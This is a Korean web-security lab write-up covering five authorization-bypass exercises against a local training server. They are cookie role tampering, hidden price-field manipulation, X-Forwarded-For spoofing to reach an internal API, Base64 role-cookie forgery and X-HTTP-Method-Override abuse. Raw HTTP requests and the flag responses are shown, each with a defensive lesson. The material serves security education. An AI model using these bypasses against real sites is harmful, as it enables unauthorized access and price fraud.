---
title: "웹보안 및 모의해킹 Lab - Auth Labs (2) State and Header Bypass"
date: 2026-03-20T18:10:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - Auth Labs
  - Cookie Tampering
  - Hidden Field Manipulation
  - Header-Based Access Control
  - Method Override
last_modified_at: 2026-03-26T18:10:00+09:00
published: true
---
## 문제

대상: `http://192.168.0.21:8080/vuln/auth/`

범위: `LAB13 ~ LAB17`

## 개요

이 구간은 서버가 신뢰하면 안 되는 상태값을 클라이언트가 가지고 있을 때 어떤 문제가 생기는지를 확인하는 실습임

핵심

- 쿠키 값만으로 권한 판단
- Base64 같은 인코딩 값을 보호 장치처럼 사용
- hidden input 값을 결제 신뢰값으로 사용
- IP 기반 접근 통제를 헤더로 판단
- 메서드 제한을 override 헤더로 우회

즉 “클라이언트가 조작 가능한 값”을 서버가 그대로 권한 판단이나 결제 판단에 사용하면 우회가 가능해짐

## LAB13. Cookie-Based Access Bypass

### 개요

페이지 접근 권한을 쿠키 하나로 판별하는 구조. 쿠키 값을 바꾸면 관리자 패널이 그대로 노출됨

### 문제 코드

```html
<!-- Cookie: user_role=user -->
```

화면에는 일반 사용자 포털처럼 보이지만, 실제 권한 판단 기준이 쿠키에 들어 있음을 주석이 직접 드러낸다

### 분석 포인트

- `user_role=user`라는 값이 클라이언트 쿠키에 존재함
- 서버가 이 값을 신뢰하면, 사용자가 직접 `admin`으로 바꿀 수 있음
- 서명이나 무결성 검증이 없다면 단순 문자열 변경만으로 우회 가능함

### 사용한 방법

개발자도구 또는 Burp에서 쿠키를 다음과 같이 수정:

```text
user_role=admin
```

### 결과

```text
COOKIE-TAMPER-KEY-2024
```

### 정리

권한은 서버 세션이나 검증 가능한 토큰으로 판단해야 하며, 단순 쿠키 문자열을 그대로 신뢰하면 Cookie Tampering이 됨

## LAB14. Hidden Field Manipulation

### 개요

구매 페이지의 결제 금액이 hidden input에 저장되어 있고, 서버는 이를 그대로 신뢰하는 구조

### 문제 코드

```html
<form id="purchaseForm">
    <input type="hidden" name="price" value="50000">
    <input type="hidden" name="discount" value="0">
    <input type="hidden" name="product_id" value="1">
</form>
```

### 분석 포인트

- 화면에 보이는 금액은 disabled input으로만 표시됨
- 실제 서버로 가는 값은 hidden input `price`
- 사용자는 hidden field를 직접 바꿀 수 있음
- 서버가 상품 ID 기준으로 가격을 다시 조회하지 않으면 금액 조작이 가능함

### 조작 내용

```html
<input type="hidden" name="price" value="50000">
```

를

```html
<input type="hidden" name="price" value="0">
```

로 변경한 뒤 결제 요청 전송

### 결과

```text
HIDDEN-PRICE-TAMPER-2024
```

### 정리

가격, 할인율, 수량, 배송비: 서버 비신뢰 값
hidden input: 숨김일 뿐 보호 장치 아님

## LAB15. Header-Based Access Bypass

### 개요

내부 API 접근 통제를 IP 기반으로 수행하고 있고, 그 IP 판단에 요청 헤더가 관여하는 구조

### 문제 코드

프론트는 내부 API 테스트 콘솔 형태이며, 버튼 클릭 시 단순히 `?action=` 값만 바꿔 호출

```javascript
fetch('?action=check_access').then(function(r){return r.json();}).then(function(d){
    document.getElementById('currentIp').textContent = d.your_ip;
});

window.callApi = function(endpoint){
    fetch('?action=' + endpoint).then(function(r){return r.json();}).then(function(d){
        var json = JSON.stringify(d, null, 2);
    });
};
```

즉 접근 통제 로직은 프론트가 아니라 서버의 `check_access`, `internal_api`, `system_status` 처리부에 있다고 추론 가능

### 분석 포인트

실습 목표와 API 동작을 보면 서버가 내부망 여부를 판단한 뒤 `internal_api` 접근을 허용하는 구조임을 확인 가능

이 문제의 핵심

- 서버가 `REMOTE_ADDR` 같은 실제 접속 IP보다
- `X-Forwarded-For`, `X-Real-IP`, `Client-IP` 같은 헤더를 신뢰하고
- 이를 기반으로 내부 사용자 여부를 결정함

이런 헤더는 원래 프록시나 로드밸런서가 붙이는 값이지만, 서버가 검증 없이 받아들이면 Burp에서 직접 조작 가능함

### 원본 요청

```http
GET /vuln/auth/lab15.php?action=internal_api HTTP/1.1
Host: 192.168.0.21:8080
Cookie: PHPSESSID=7025426544d7fcfea16fe8ca861c2b4f; user_role=user
```

### 추가한 헤더

```http
X-Forwarded-For: 127.0.0.1
```

### 우회 요청

```http
GET /vuln/auth/lab15.php?action=internal_api HTTP/1.1
Host: 192.168.0.21:8080
Cookie: PHPSESSID=7025426544d7fcfea16fe8ca861c2b4f; user_role=user
X-Forwarded-For: 127.0.0.1
```

### 응답

```json
{"success":true,"message":"내부 API 접근이 허용되었습니다.","your_ip":"127.0.0.1","system_info":{"auth_token":"INTERNAL-HEADER-BYPASS-2024","db_host":"db-master.seculab.internal:3306","api_version":"v2.4.1","environment":"production","last_deploy":"2024-01-25 15:30:00"}}
```

### 결과

```text
INTERNAL-HEADER-BYPASS-2024
```

### 정리

헤더를 추가하면 되는 이유는, 네트워크상의 실제 요청보다 서버가 최종 해석한 클라이언트 IP가 권한 판단 기준이기 때문임

## LAB16. Base64 User Context Cookie

### 개요

사용자 컨텍스트가 `uc_ctx` 쿠키에 Base64 JSON 형태로 저장되어 있고, 서버는 이를 그대로 디코딩해 역할을 판단하는 구조

### 문제 코드

```html
<!-- Dev: 내부 API는 ?action=internal_secret, 컨텍스트는 uc_ctx(Base64 JSON) -->
```

```javascript
document.getElementById('btnWhoami').addEventListener('click',function(){
    fetch('?action=whoami')
});

document.getElementById('btnSecret').addEventListener('click',function(){
    fetch('?action=internal_secret')
});
```

주석과 버튼 이름만으로도 `whoami`와 `internal_secret`가 현재 컨텍스트를 기준으로 동작함을 확인 가능

### 원본 쿠키

```text
uc_ctx=eyJ1aWQiOjI1LCJyb2xlIjoidXNlciJ9
```

디코딩 결과:

```json
{"uid":25,"role":"user"}
```

### 조작한 값

수정 JSON:

```json
{"uid":25,"role":"admin"}
```

재인코딩 값:

```text
eyJ1aWQiOjI1LCJyb2xlIjoiYWRtaW4ifQ==
```

### 결과

```json
{
  "success": true,
  "secret": "UC-TAMPER-ADMIN-2024-KEY",
  "message": "관리자 전용 내부 키입니다."
}
```

### 정리

Base64는 인코딩일 뿐 보호 기능이 없음. 서명이나 무결성 검증 없이 쿠키에 역할 정보를 넣으면 누구나 관리자 컨텍스트로 바꿀 수 있음

## LAB17. HTTP Method Override

### 개요

이 랩의 핵심: 실제 HTTP 메서드가 아니라 서버가 최종적으로 해석하는 메서드

문제 설명상 `admin_dump`: GET만 허용
브라우저 버튼: POST 호출만 가능
`X-HTTP-Method-Override` 신뢰 시 메서드 제한 우회 가능

### 문제 코드

페이지 설명과 버튼 동작은 다음과 같았음

```html
<p>엔드포인트: <span class="code">GET ?action=admin_dump</span></p>
<p>프론트엔드는 실수 방지를 위해 POST로만 호출 버튼을 제공합니다 (서버는 GET만 허용).</p>
<button type="button" id="btnPost">POST로 admin_dump 시도 (실패 예상)</button>
```

```javascript
document.getElementById('btnPost').addEventListener('click', function(){
    fetch('?action=admin_dump', { method:'POST' })
        .then(function(r){ return r.json(); })
        .then(function(d){
            document.getElementById('out').textContent = JSON.stringify(d, null, 2);
        });
});
```

즉 UI는 POST 강제 구조
서버의 override 헤더 신뢰 여부 확인 필요

### 원본 요청

```http
POST /vuln/auth/lab17.php?action=admin_dump HTTP/1.1
Host: 192.168.0.21:8080
Cookie: PHPSESSID=7025426544d7fcfea16fe8ca861c2b4f; user_role=user; uc_ctx=eyJ1aWQiOjI1LCJyb2xlIjoiYWRtaW4ifQ==
```

### 분석 포인트

- 프론트는 POST만 보냄
- 그러나 서버가 `X-HTTP-Method-Override: GET` 헤더를 신뢰하면
- 내부적으로는 “이 요청은 GET”이라고 다시 해석할 수 있음

즉 원본 요청 메서드와 서버의 최종 판단 메서드가 달라지면 우회가 가능함

### 우회 요청

```http
POST /vuln/auth/lab17.php?action=admin_dump HTTP/1.1
Host: 192.168.0.21:8080
Cookie: PHPSESSID=7025426544d7fcfea16fe8ca861c2b4f; user_role=user; uc_ctx=eyJ1aWQiOjI1LCJyb2xlIjoiYWRtaW4ifQ==
X-HTTP-Method-Override: GET
```

### 응답

```json
{"success":true,"dump":"METHOD-OVERRIDE-BYPASS-2024","note":"레거시 관리자 덤프 토큰"}
```

### 결과

```text
METHOD-OVERRIDE-BYPASS-2024
```

### 정리

메서드 제한은 서버가 실제로 어떤 값을 기준으로 검사하는지가 중요함. override 헤더를 검증 없이 신뢰하면 GET 전용 엔드포인트 우회가 가능함

## 정리

이 구간의 공통 취약점은 모두 “클라이언트가 조작 가능한 상태값을 서버가 그대로 신뢰했다”는 점임

- `Cookie Tampering`
- `Hidden Field Manipulation`
- `Header-Based Access Control`
- `Method Override Abuse`

화면에서 보이지 않는다고 안전한 것도 아니고, 인코딩되어 있다고 보호되는 것도 아니며, 프록시용 헤더라고 해서 사용자가 못 넣는 것도 아님



